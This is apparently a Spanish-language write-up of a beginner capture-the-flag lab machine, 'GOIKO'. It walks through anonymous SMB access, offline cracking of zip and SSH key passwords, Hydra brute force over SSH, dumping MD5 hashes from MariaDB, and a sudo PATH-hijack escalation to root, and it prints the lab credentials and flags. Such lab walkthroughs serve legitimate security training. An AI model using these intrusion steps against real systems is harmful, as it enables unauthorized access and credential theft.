# GOIKO

Máquina de nivel principiante de The HackersLab. IP: `192.168.100.161`

## 1. Reconocimiento

Como primer paso realizamos el reconocimiento escaneando todos los puertos y servicios con `nmap`:

```
nmap -p- --open --min-rate 5000 -sS -Pn -n -vvv 192.168.100.161
```

![[Captura de pantalla 2026-09-29 234606 1.png]]

En la captura del escaneo de servicios se abren los puertos:

- **22/tcp** → OpenSSH 9.2p1 Debian.
- **139/tcp y 445/tcp** → Samba smbd 4 (NetBIOS name `VENTURA`).

## 2. Enumeración SMB anónima

Enumeramos el servicio SMB de forma anónima con `enum4linux`:

```
enum4linux -A 192.168.100.161
```

![[Pasted image 20260929234333.png]]

El equipo pertenece al workgroup `WORKGROUP` y no encontramos usuarios relevantes por anonymous session, así que listamos los recursos compartidos con `smbclient` sin credenciales:

```
smbclient -L //192.168.100.161 -N
```

![[Captura de pantalla 2026-09-29 235328.png]]

Se listan los shares `print$`, `food`, `dessert`, `menu`, `IPC$` y `nobody`.

Por los cual ingresamos al share `menu` y descargamos su contenido, donde encontramos un archivo oculto con credenciales:

![[Pasted image 20260930011540.png]]

- `user` = marmai
- `pass` = EspabilaSantiago69

## 3. FTP en el puerto 10021

Una vez obtenidas las credenciales, nos autenticamos en el servicio FTP que escucha en el puerto **10021** y, una vez adentro, descargamos el archivo `BurgerWithoutCheese.zip`.

## 4. ZIP protegido con contraseña

Al intentar extraer el zip vemos que está protegido con contraseña y los archivos `id_rsa` y `users` no se descomprimen:

```
unzip BurgerWithoutCheese.zip
```

![[Pasted image 20260930014832.png]]

Para adivinar la clave, sacamos el hash del archivo zip con `zip2john` y lo volcamos en un archivo:

```
zip2john BurgerWithoutCheese.zip > zip.hash
```

![[Pasted image 20260930014857.png]]

Observamos el hash de nuestro archivo zip:

```
cat zip.hash
```

![[Pasted image 20260930014914.png]]

Y atacamos ese hash con John the Ripper usando una lista de diccionario, con lo que obtenemos la contraseña del zip:

```
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

![[Pasted image 20260930014938.png]]

La contraseña del zip es `princess95`. Introducimos la credencial para poder entrar al archivo y ya sí extraemos su contenido:

```
unzip BurgerWithoutCheese.zip
```

![[Pasted image 20260930014956.png]]

## 5. Listado de usuarios

Revisamos los archivos descomprimidos para verificar su contenido y consultamos la lista de usuarios:

```
ls
cat users
```

![[Pasted image 20260930015031.png]]

La lista contiene los usuarios `nika`, `caroline`, `gurpreet`, `santi` y `marsu`.

## 6. id_rsa y fuerza bruta con Hydra

El zip también contenía una clave privada; revisamos su contenido:

```
cat id_rsa
```

![[Pasted image 20260930015054.png]]

Hacemos el mismo volcado de hash, en este caso con `ssh2john` sobre la clave `id_rsa`, para obtener la credencial:

```
ssh2john id_rsa > hasha.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hasha.txt
```

![[Pasted image 20260930015136.png]]

La passphrase de la clave es `babygirl`. Como esa clave no sabemos a qué usuario pertenece, utilizamos la herramienta `hydra` para probarla contra toda la lista de usuarios por SSH:

```
hydra -L users -p babygirl ssh://192.168.100.161
```

![[Pasted image 20260930015202.png]]

- **login:** gurpreet
- **password:** babygirl

Con estas credenciales nos autenticamos por SSH como `gurpreet` y vemos los siguientes archivos:

![[Pasted image 20260930015320.png]]

## 7. Bandera user.txt

Revisamos la bandera de usuario:

```
cat user.txt
```

![[Pasted image 20260930015342.png]]

`765d76sdsafs6af4da0c0f39a14b96d`

## 8. Base de datos MariaDB

Con el usuario `gurpreet` realizamos conexión a la base de datos con MariaDB:

```
mariadb -u gurpreet -p
show databases;
```

![[Pasted image 20260930153031.png]]

![[Pasted image 20260930155619.png]]

![[Pasted image 20260930155825.png]]

Se listan las bases de datos `ceti`, `information_schema`, `mysql`, `performance_schema`, `secta` y `sys`. La que nos interesa es `secta`, donde revisamos sus tablas y registros:

```
use secta;
show tables;
select * from integrantes;
```

![[Pasted image 20260930155854.png]]

Y vemos que tenemos usuario y contraseña:

| id | name | password |
|----|------|----------|
| 1 | carline | 703ff9a12582b2aaaa3fe7f89bb976c8 |
| 2 | nika | c6f606a66a30cbaa428131d4c074787 |

## 9. Contraseñas (hash MD5)

Los valores de la columna `password` son hashes MD5. Por local podemos revisarlos con un servicio online de desencriptado MD5 y encontramos las credenciales para ingresar:

![[Pasted image 20260930021032.png]]

- **nika:** lucymylove

## 10. Acceso SSH

Ingresamos por SSH al usuario que corresponde:

```
ssh nika@192.168.33.106
```

![[Pasted image 20260930163736.png]]

> Nota: en esta fase la máquina aparece en otra red (`192.168.33.106`), tal como se ve en el comando de la captura.

## 11. Escalada de privilegios (hijack de PATH)

Revisamos el script `/opt/porno/watchporn.sh`:

```
cat /opt/porno/watchporn.sh
```

Su contenido es:

```
#!/bin/bash
learningbash="Hello World"
echo $learningbash

find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

El problema de seguridad es que el script invoca a `find` **sin ruta absoluta**, de modo que Bash lo resuelve buscando en los directorios del `PATH`. La técnica de escalada es el *hijack* del PATH:

1. Creamos, dentro de `/opt/porno`, un binario falso llamado `find` cuyo contenido sea `/bin/bash` (es decir, un ejecutable que abre una shell).
2. Le damos permisos de ejecución con `chmod 777`.
3. Ejecutamos el script con `sudo` y un `PATH` manipulado donde `/opt/porno` es el primer directorio, de forma que `find` resuelva a nuestro archivo falsificado y se ejecute con privilegios de root.

Comprobamos primero el PATH actual y después lanzamos el script:

```
cd /opt/porno
echo "/bin/bash" > find
chmod 777 find
echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
sudo PATH=/opt/porno:$PATH /opt/porno/watchporn.sh
```

![[Pasted image 20260930170612.png]]

Al ejecutarse `find` con privilegios obtenemos una shell de root; lo confirmamos con `id`:

```
id
```

![[Pasted image 20260930170730.png]]

`uid=0(root) gid=0(root) groups=0(root)`

Por último, leemos la bandera de root:

```
cat /root/root.txt
```

![[Pasted image 20260930170954.png]]

`gsgs67adsrfs63bnfmdmvfsi83`
